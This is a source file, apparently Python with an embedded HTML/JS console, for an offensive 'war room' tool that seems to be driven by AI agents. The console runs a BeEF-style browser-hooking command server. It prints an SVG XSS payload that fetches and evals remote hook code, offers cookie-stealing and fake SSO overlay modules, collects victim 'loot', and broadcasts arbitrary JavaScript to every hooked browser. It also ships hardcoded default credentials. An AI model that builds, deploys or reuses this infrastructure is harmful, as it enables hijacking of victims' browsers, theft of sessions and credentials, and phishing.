  const allEv = [...(t.events || [])].reverse().filter(e => wireFilter === 'ALL' || e.category === wireFilter);
  document.getElementById('opsWirePane').innerHTML = allEv.slice(0, 180).map(e => `
    <div class="ev-row ${esc(e.level)}">
      <span style="color:var(--muted);min-width:68px">${new Date(e.ts*1000).toLocaleTimeString()}</span>
      <span class="ev-cat">${esc(e.category)}</span>
      <strong style="min-width:74px;color:${COLORS[e.agent]||'var(--cyan)'}">${esc(e.agent)}</strong>
      <span style="flex:1">${esc(e.title)} <span style="color:var(--muted)">${esc(e.detail || '')}</span></span>
    </div>`).join('');
}

function renderBeef() {
  if (activeView !== 'beef') return;
  const b = state.beef || {};
  document.getElementById('hookUrlBox').textContent =
    `Browser Hook URL: ${publicHookUrl()}\nSVG WAF Bypass:  "><svg/onload="fetch('${publicHookUrl()}').then(r=>r.text()).then(eval)">`;
  document.getElementById('targetSidLabel').textContent = selectedSid === '*' ? '* ALL HOOKED BROWSERS' : selectedSid;

  const list = b.sessions_list || [];
  document.getElementById('beefSessions').innerHTML = `
    <div class="crew-card ${selectedSid === '*' ? 'active' : ''}" onclick="selectedSid='*';renderBeef()">
      <strong style="color:var(--cyan)">📡 Broadcast (* All Hooked Browsers — ${list.length})</strong>
    </div>` + (list.length ? list.map(s => {
      const tel = s.telemetry || {};
      return `
      <div class="crew-card ${selectedSid === s.sid ? 'active' : ''}" onclick="selectedSid='${esc(s.sid)}';renderBeef()">
        <div style="display:flex;justify-content:space-between">
          <strong style="color:${s.online ? 'var(--green)' : 'var(--yellow)'}">${s.online ? '🟢' : '🟡'} ${esc(s.sid)}</strong>
          <span style="font-size:10px;color:var(--muted)">${s.age_sec}s ago</span>
        </div>
        <div style="font-size:10.5px;color:#dbeafe;margin-top:3px">${esc(tel.title || tel.href || s.remote)}</div>
        <div style="font-size:10px;color:var(--muted);margin-top:3px">Cookies: ${tel.cookie_len||0}B · Forms: ${tel.forms||0} · Inputs: ${tel.inputs||0} · ${esc(tel.screen||'')}</div>
      </div>`;
    }).join('') : '<div style="font-size:11px;color:var(--muted);margin-bottom:8px">No hooked browsers yet — click <b>🪝 Hook Demo Victim</b> above to hook a live session instantly!</div>');

  if (!document.getElementById('beefModules').dataset.rendered && (b.modules || []).length) {
    document.getElementById('beefModules').dataset.rendered = '1';
    document.getElementById('beefModules').innerHTML = b.modules.map(m => `
      <button class="mod-btn" onclick='runBeefModule(${JSON.stringify(m.id)}, ${JSON.stringify(m.name)}, ${JSON.stringify(m.js)})'>
        <span>⚡ ${esc(m.name)} <span class="badge">${esc(m.risk)}</span></span>
        <small>${esc(m.description)}</small>
      </button>`).join('');
  }

  document.getElementById('beefLootPane').innerHTML = (b.loot || []).length ? b.loot.map(l => `
    <div class="finding critical">
      <div style="display:flex;justify-content:space-between">
        <strong style="color:var(--green)">💎 ${esc(l.kind)} (${esc(l.sid)})</strong>
        <span style="color:var(--muted);font-size:10px">${new Date(l.ts*1000).toLocaleTimeString()}</span>
      </div>
      <pre class="code">${esc(JSON.stringify(l.data, null, 2))}</pre>
    </div>`).join('') : '<div style="color:var(--muted);font-size:11px">Run <b>Steal Cookies & Storage</b> or <b>Inject SSO Re-Auth Overlay</b> to capture live victim loot here.</div>';

  document.getElementById('beefResultsPane').innerHTML = (b.command_log || []).length ? b.command_log.map(c => `
    <div class="finding">
      <div style="display:flex;justify-content:space-between">
        <strong style="color:var(--cyan)">${esc(c.label)} → ${esc(c.sid)}</strong>
        <span class="state-chip ${c.status === 'EXECUTED' ? 'DONE' : 'RUNNING'}">${esc(c.status)}</span>
      </div>
      ${c.output ? `<pre class="code">${esc(c.output)}</pre>` : '<div style="color:var(--muted);font-size:10.5px;margin-top:4px">Awaiting zombie browser poll...</div>'}
    </div>`).join('') : '<div style="color:var(--muted);font-size:11px">No commands queued yet.</div>';

  const oob = state.oob || {};
  document.getElementById('oobHitsPane').innerHTML = (oob.hits || []).length ? oob.hits.map(h => `
    <div class="finding high">
      <strong style="color:var(--magenta)">📡 ${esc(h.method || 'HIT')} ${esc(h.path || h.token)}</strong>
      <div style="font-size:10.5px;color:var(--muted)">Remote: ${esc(h.remote || 'remote')} · Channel: ${esc(h.channel)}</div>
    </div>`).join('') : '<div style="color:var(--muted);font-size:11px">No OOB callbacks recorded yet.</div>';
}

function renderFindingsView() {
  if (activeView !== 'findings') return;
  document.getElementById('arsenalList').innerHTML = toolsCache.map(t => `
    <div class="finding">
      <div style="display:flex;justify-content:space-between">
        <strong style="color:var(--cyan)">${esc(t.name)}</strong>
        <span style="color:var(--green)">${esc(t.source)} :: ${esc(t.status)}</span>
      </div>
      <div style="color:var(--muted);font-size:10px;margin-top:3px">${esc(t.version || '')}</div>
    </div>`).join('');

  document.getElementById('fullFindingsPane').innerHTML = [
    ...(state.verified || []).map(f => `
      <div class="finding critical">
        <div style="display:flex;justify-content:space-between">
          <strong style="color:var(--green)">✅ VERIFIED [${esc((f.severity||'').toUpperCase())}] :: ${esc(f.type)} (CVSS ${esc(f.cvss_score||'')})</strong>
          <span style="color:var(--muted)">Detected by ${esc(f.detected_by)} · Escalated: ${esc((f.escalated_with||[]).join(', ')||'n/a')}</span>
        </div>
        <div style="color:var(--cyan);margin-top:4px">${esc(f.url)} (param: <code>${esc(f.parameter||'n/a')}</code>)</div>
        <div style="margin-top:5px">${esc(f.evidence)}</div>
        ${f.curl_poc ? `<pre class="code">${esc(f.curl_poc)}</pre>` : ''}
      </div>`),
    ...(state.disproved || []).map(f => `
      <div class="finding disproved">
        <strong style="color:var(--red)">🍑 BINNED FALSE POSITIVE :: ${esc(f.type)} @ ${esc(f.url)}</strong>
        <div style="color:#ffb3c1;margin-top:4px">${esc((f.critic_notes||[]).join(' | '))}</div>
      </div>`)
  ].join('') || '<p style="color:var(--muted)">Run <b>⚡ 6-Agent Autopilot</b> to populate verified advisories, curl PoCs, and RAZOR brown-eye disproofs.</p>';
}

function render() {
  const st = state.status || {};
  const totals = (state.telemetry && state.telemetry.totals) || {};
  const ti = document.getElementById('targetInput');
  if (st.target && ti !== document.activeElement) ti.value = st.target;

  document.getElementById('kHttp').textContent = totals.http_requests || 0;
  document.getElementById('kBin').textContent = totals.bin_runs || 0;
  document.getElementById('kWaf').textContent = totals.waf_bypasses || 0;
  document.getElementById('kBeef').textContent = st.beef_online || 0;
  document.getElementById('kOob').textContent = st.oob_hits || 0;
  document.getElementById('kVer').textContent = st.verified_count || 0;
  document.getElementById('kBinFp').textContent = st.disproved_count || 0;

  const activeProcs = ((state.telemetry && state.telemetry.active_processes) || []).length;
  document.getElementById('navActiveCnt').textContent = activeProcs + ' active';
  document.getElementById('navBeefCnt').textContent = (st.beef_online || 0) + ' hooked';
  document.getElementById('navVerCnt').textContent = st.verified_count || 0;
  document.getElementById('cntV').textContent = st.verified_count || 0;
  document.getElementById('cntD').textContent = st.disproved_count || 0;
  document.getElementById('cntC').textContent = st.chains_count || 0;

  const jp = document.getElementById('jobPill');
  if (st.running_job) {
    jp.classList.add('live');
    document.getElementById('jobText').textContent = `${st.running_job.command} (${st.running_job.elapsed_s || 0}s)`;
    document.getElementById('chatTyping').textContent = `⚡ Crew executing: ${st.running_job.command}...`;
  } else {
    jp.classList.remove('live');
    document.getElementById('chatTyping').textContent = '';
  }

  document.getElementById('llmBadge').textContent = st.llm?.display_mode || st.llm?.active_provider || 'groq';
  const ks = document.getElementById('keyStatus');
  if (ks && st.llm) ks.textContent = `Active: ${st.llm.active_provider} (${st.llm.active_model}) | Endpoint: ${st.llm.base_url} | Key: ${st.llm.api_key_masked}`;

  renderCrew();
  renderChat();
  renderRight();
  renderOps();
  renderBeef();
  renderFindingsView();
}

async function refreshState() {
  try {
    state = await api('api/state');
    render();
  } catch (e) {}
}

async function sendCmd(message, speaker = '', asyncMode = true) {
  await api('api/chat', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({message, speaker, async: asyncMode})
  });
  await refreshState();
}

function toggleKeyBar() {
  const el = document.getElementById('keyBar');
  el.style.display = (el.style.display === 'none' ? 'flex' : 'none');
}

async function saveLlmKey() {
  const provider = document.getElementById('provSelect').value;
  const api_key = document.getElementById('apiKeyInput').value.trim();
  const model = document.getElementById('modelInput').value.trim();
  await api('api/llm', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({provider, api_key, model})
  });
  document.getElementById('apiKeyInput').value = '';
  await refreshState();
}

async function setTarget() {
  const v = document.getElementById('targetInput').value.trim();
  if (v) await sendCmd('/target ' + v, '', false);
}

async function onSubmitChat(ev) {
  ev.preventDefault();
  const inp = document.getElementById('chatInput');
  const speaker = document.getElementById('speakerSelect').value;
  const msg = inp.value.trim();
  if (!msg) return;
  inp.value = '';
  await sendCmd(msg, speaker, true);
}

api('api/tools').then(d => { toolsCache = d.tools || []; if (state) renderFindingsView(); }).catch(() => {});
refreshState().then(() => {
  if (state && (!state.transcript || !state.transcript.length)) {
    sendCmd('Oi crew! Sound off with station status in #basement-ops!', '', true);
  }
});
setInterval(refreshState, 650);
</script>
</body>
</html>
"""


def _verify_basic_auth(auth_header: str | None, expected_user: str, expected_pass: str) -> bool:
    if not auth_header or not auth_header.startswith("Basic "):
        return False
    try:
        decoded = base64.b64decode(auth_header[6:].strip()).decode("utf-8", errors="strict")
    except Exception:
        return False
    if ":" not in decoded:
        return False
    got_user, got_pass = decoded.split(":", 1)
    return secrets.compare_digest(got_user, expected_user) and secrets.compare_digest(got_pass, expected_pass)


def start_warroom_server(
    host: str = "0.0.0.0",
    port: int = 8787,
    target: str | None = None,
    auto_lab: bool = False,
    block: bool = True,
    auth_user: str | None = None,
    auth_pass: str | None = None,
    require_auth: bool = True,
):
    CFG["crew_banter"] = True
    ui_user = auth_user if auth_user is not None else os.environ.get("BUGHUNTER_UI_USER", "admin")
    ui_pass = auth_pass if auth_pass is not None else os.environ.get("BUGHUNTER_UI_PASS", "bugsBounty")

    session = WarRoomSession(target=target)
    if auto_lab and not session.target:
        session.start_lab()
    beef_srv = get_beef_server()
    oob_mgr = get_oob_manager()
    tools_snapshot = ToolRegistry.audit()

    class Handler(BaseHTTPRequestHandler):
        def log_message(self, fmt, *args):
            return

        def _require_operator_auth(self) -> bool:
            if not require_auth:
                return True
            if _verify_basic_auth(self.headers.get("Authorization"), ui_user, ui_pass):
                return True
            body = b'{"error":"Authentication required (default Basic Auth -> admin:bugsBounty)"}'
            self.send_response(401)
            self.send_header('WWW-Authenticate', 'Basic realm="bugsBounty #basement-ops"')
            self.send_header("Content-Type", "application/json; charset=utf-8")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
            return False

        def _raw_reply(self, status: int, content_type: str, data: bytes):
            self.send_response(status)
            self.send_header("Content-Type", content_type)
            self.send_header("Access-Control-Allow-Origin", "*")
            self.send_header("Access-Control-Allow-Headers", "*")
            self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
            self.send_header("Cache-Control", "no-store")
            self.send_header("Content-Length", str(len(data)))
            self.end_headers()
            self.wfile.write(data)

        def _json(self, status: int, data: dict):
            self._raw_reply(status, "application/json; charset=utf-8", json.dumps(data, default=str).encode("utf-8"))

        def do_OPTIONS(self):
            self._json(200, {"ok": True})

        def do_GET(self):
            parsed = urllib.parse.urlparse(self.path)
            path = parsed.path.rstrip("/") or "/"
            qs = urllib.parse.parse_qs(parsed.query)

            # Public Victim Hook & OOB Callback Endpoints (must remain open to hooked browsers / SSRF targets!)
            if path == "/beef/hook.js":
                fid = (qs.get("fid") or ["web-xss"])[0]
                js = beef_srv.render_hook_js(
                    fid=fid,
                    c2_base="",  # auto-derives exact origin + `/beef` from `document.currentScript.src`!
                    remote=self.client_address[0],
                    ua=self.headers.get("User-Agent", ""),
                    referer=self.headers.get("Referer", ""),
                )
                self._raw_reply(200, "application/javascript; charset=utf-8", js.encode("utf-8"))
                return

            if path == "/beef/poll":
                sid = (qs.get("session") or qs.get("sid") or [""])[0]
                self._json(200, beef_srv.handle_poll(sid))
                return

            if path == "/beef/victim":
                self._raw_reply(200, "text/html; charset=utf-8", DEMO_VICTIM_HTML.encode("utf-8"))
                return

            if path.startswith("/oob/"):
                m = re.search(r"/oob/([A-Za-z0-9_-]+)", path)
                tok = m.group(1) if m else "probe"
                oob_mgr.record_hit(tok, "GET", self.path, self.client_address[0], headers=dict(self.headers), channel="web_proxy_oob")
                self._raw_reply(200, "text/plain; charset=utf-8", f"oob-ack:{tok}".encode("utf-8"))
                return

            # All Operator Console Routes Require HTTP Basic Auth (`admin:bugsBounty`)
            if not self._require_operator_auth():
                return

            if path in ("/", "/index.html"):
                self._raw_reply(200, "text/html; charset=utf-8", HTML_PAGE.encode("utf-8"))
                return
            if path == "/api/state":
                since = int((qs.get("since") or ["0"])[0] or 0)
                host_hdr = self.headers.get("Host") or f"127.0.0.1:{httpd.server_address[1]}"
                proto = self.headers.get("X-Forwarded-Proto") or "http"
                self._json(200, session.state_snapshot(since_seq=since, public_hook_url=f"{proto}://{host_hdr}/beef/hook.js"))
                return
            if path == "/api/telemetry":
                since = int((qs.get("since") or ["0"])[0] or 0)
                from core.telemetry import TELEMETRY
                self._json(200, TELEMETRY.snapshot(since_seq=since))
                return
            if path == "/api/beef":
                self._json(200, beef_srv.snapshot())
                return
            if path == "/api/oob":
                self._json(200, oob_mgr.snapshot())
                return
            if path == "/api/tools":
                self._json(200, {"tools": tools_snapshot})
                return
            if path == "/health":
                self._json(200, {"ok": True, "auth_user": ui_user, "status": session.status_dict()})
                return
            self._json(404, {"error": "not found"})

        def do_POST(self):
            parsed = urllib.parse.urlparse(self.path)
            path = parsed.path.rstrip("/")
            qs = urllib.parse.parse_qs(parsed.query)
            length = int(self.headers.get("Content-Length", "0") or 0)
            raw_body = self.rfile.read(min(length, 131072)).decode("utf-8", errors="ignore") if length else ""
            try:
                body = json.loads(raw_body) if raw_body else {}
            except Exception:
                body = {}

            # Public Victim BeEF Beacons, Command Results & Captured Loot Endpoints
            if path in ("/beef/beacon", "/beef/result", "/beef/loot"):
                sid = (qs.get("sid") or qs.get("session") or [body.get("sid") or body.get("session") or ""])[0]
                fid = (qs.get("fid") or [body.get("fid") or "web-xss"])[0]
                if path == "/beef/beacon":
                    self._json(200, beef_srv.handle_beacon(sid, fid, self.client_address[0], body))
                elif path == "/beef/result":
                    self._json(200, beef_srv.handle_result(sid, body))
                else:
                    self._json(200, beef_srv.handle_loot(sid, fid, self.client_address[0], body))
                return

            # All Operator POST APIs Enforce Basic Auth (`admin:bugsBounty`)
            if not self._require_operator_auth():
                return

            if path == "/api/chat":
                if body.get("async"):
                    out = session.submit_async(body.get("message", ""), speaker_target=body.get("speaker") or None)
                else:
                    out = session.handle_message(body.get("message", ""), speaker_target=body.get("speaker") or None)
                self._json(200, out)
                return

            if path == "/api/beef/command":
                sid = (body.get("sid") or "*").strip()
                js_code = (body.get("js") or "").strip()
                mod_name = (body.get("module") or "custom_js").strip()
                label = (body.get("label") or mod_name).strip()
                if not js_code:
                    self._json(400, {"error": "Missing js payload"})
                    return
                if sid in ("*", "all", "ALL"):
                    queued = beef_srv.broadcast_command(js_code, module_name=mod_name, label=label)
                    self._json(200, {"ok": True, "broadcast": True, "queued_ids": queued})
                else:
                    cid = beef_srv.queue_command(sid, js_code, module_name=mod_name, label=label)
                    self._json(200, {"ok": True, "cmd_id": cid, "sid": sid})
                return

            if path == "/api/oob/test":
                canary = oob_mgr.generate_canary("ui-test")
                oob_mgr.record_hit(canary["token"], "GET", f"/oob/{canary['token']}?source=ui-self-test", "127.0.0.1", channel="self_test")
                self._json(200, {"ok": True, "canary": canary, "oob": oob_mgr.snapshot()})
                return

            if path == "/api/llm":
                info = configure_api_key(
                    api_key=body.get("api_key") or None,
                    provider=body.get("provider") or None,
                    model=body.get("model") or None,
                    persist=True,
                )
                st_llm = get_llm().status_summary()
                CREW_BUS.say(
                    "GHOST",
                    f"Updated live LLM config -> provider=`{st_llm['active_provider']}` | model=`{st_llm['active_model']}` | key=`{st_llm['api_key_masked']}`!",
                    kind="cheer",
                )
                self._json(200, {"ok": True, "info": info, "llm": st_llm})
                return

            self._json(404, {"error": "not found"})

    ThreadingHTTPServer.allow_reuse_address = True
    httpd = ThreadingHTTPServer((host, port), Handler)
    if block:
        print(
            f"[bugsBounty] #basement-ops Command Center live on http://{host}:{httpd.server_address[1]} "
            f"(Basic Auth -> {ui_user}:{ui_pass})",
            flush=True,
        )
        httpd.serve_forever()
    else:
        t = threading.Thread(target=httpd.serve_forever, daemon=True)
        t.start()
    return httpd, session
